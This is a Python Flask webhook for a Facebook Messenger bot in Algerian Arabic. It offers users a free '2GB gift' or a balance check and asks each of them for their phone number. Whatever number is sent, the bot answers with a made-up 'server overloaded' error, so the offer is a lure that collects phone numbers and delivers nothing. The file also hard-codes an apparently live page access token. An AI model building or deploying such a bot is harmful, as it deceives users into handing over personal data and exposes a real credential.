from flask import Flask, request
import requests

app = Flask(__name__)

PAGE_ACCESS_TOKEN = "EAAUvcXvXsl8BQmZA79p8uXBtCdcQoeWyZC5Kg2uiHBSRjJ9ArIGMwh6dYljSMPDrr2adr4JhbNJHzbZBJpvZCq8sX791DqIUeG04AoHR6YlERniFcKAA4DdDnjPgiHA8TynDJgZCHZCpFalzNvCxrORdvjjxEPZAR1aZBWWEkROU5PnoU1hZAESiUDN4hZCLal0FfrZCMYq8QZDZD"
VERIFY_TOKEN = "wassim_chikor_2026"

def get_user_name(user_id):
    url = f"https://graph.facebook.com/{user_id}?fields=first_name&access_token={PAGE_ACCESS_TOKEN}"
    try:
        response = requests.get(url).json()
        return response.get("first_name", "خويا")
    except:
        return "خويا"

def send_welcome(user_id):
    user_name = get_user_name(user_id)
    url = f"https://graph.facebook.com/v18.0/me/messages?access_token={PAGE_ACCESS_TOKEN}"
    payload = {
        "recipient": {"id": user_id},
        "message": {
            "attachment": {
                "type": "template",
                "payload": {
                    "template_type": "button",
                    "text": f"مرحبا {user_name}، واش تحب نفعلو ليوم؟ 🚀",
                    "buttons": [
                        {"type": "postback", "title": "🎁 هدايا (2GB)", "payload": "GET_2GB"},
                        {"type": "postback", "title": "💰 رصيدي", "payload": "CHECK_BALANCE"}
                    ]
                }
            }
        }
    }
    requests.post(url, json=payload)

def send_text(user_id, text):
    url = f"https://graph.facebook.com/v18.0/me/messages?access_token={PAGE_ACCESS_TOKEN}"
    payload = {"recipient": {"id": user_id}, "message": {"text": text}}
    requests.post(url, json=payload)

@app.route('/webhook', methods=['GET', 'POST'])
def webhook():
    if request.method == 'GET':
        if request.args.get("hub.verify_token") == VERIFY_TOKEN:
            return request.args.get("hub.challenge")
        return "Verification failed", 403

    if request.method == 'POST':
        data = request.json
        if data.get("object") == "page":
            for entry in data.get('entry', []):
                for messaging_event in entry.get('messaging', []):
                    user_id = messaging_event['sender']['id']
                    
                    if 'postback' in messaging_event:
                        payload = messaging_event['postback']['payload']
                        if payload == "GET_2GB" or payload == "CHECK_BALANCE":
                            send_text(user_id, "للاستفادة، أرسل رقم هاتفك الآن (مثال: 07XXXXXXXX) 👇")
                    
                    elif 'message' in messaging_event and 'text' in messaging_event['message']:
                        msg = messaging_event['message']['text']
                        # إذا بعث رقم هاتف
                        if msg.isdigit() and len(msg) >= 10:
                            send_text(user_id, "جاري المعالجة... ⏳")
                            send_text(user_id, f"عذراً، الضغط كبير جداً على السيرفر حالياً بسبب كثرة الطلبات على الرقم {msg}. حاول مجدداً بعد قليل! ❌")
                        else:
                            send_welcome(user_id)
        return "ok", 200

if __name__ == '__main__':
    app.run(port=5000)
